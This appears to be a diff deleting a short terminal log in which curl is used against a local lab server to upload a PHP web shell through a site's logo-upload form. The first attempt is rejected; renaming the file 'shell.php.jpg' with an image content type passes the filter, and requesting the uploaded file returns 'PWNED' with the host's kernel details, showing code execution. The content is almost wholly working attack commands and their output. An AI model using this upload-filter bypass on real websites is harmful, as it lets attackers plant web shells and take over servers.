@@ -1,8 +1,0 @@
-$ curl -b cj.txt -F action=upload_logo -F "logo=@shellphp;filename=shell.php;type=image/jpeg" http://172.17.0.2:8080/?page=cuenta
-<div class="msg-err">Solo se permiten imágenes: jpg, jpeg, png, gif
-
-$ curl -b cj.txt -F action=upload_logo -F "logo=@shell.php.jpg;filename=shell.php.jpg;type=image/jpeg" http://172.17.0.2:8080/?page=cuenta
-<div class="msg-ok">✅ Logo actualizado: <code>/uploads/logos/shell.php.jpg</code></div>
-
-$ curl http://172.17.0.2:8080/uploads/logos/shell.php.jpg
-PWNED:Linux listener 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 (2026-07-29) x86_64
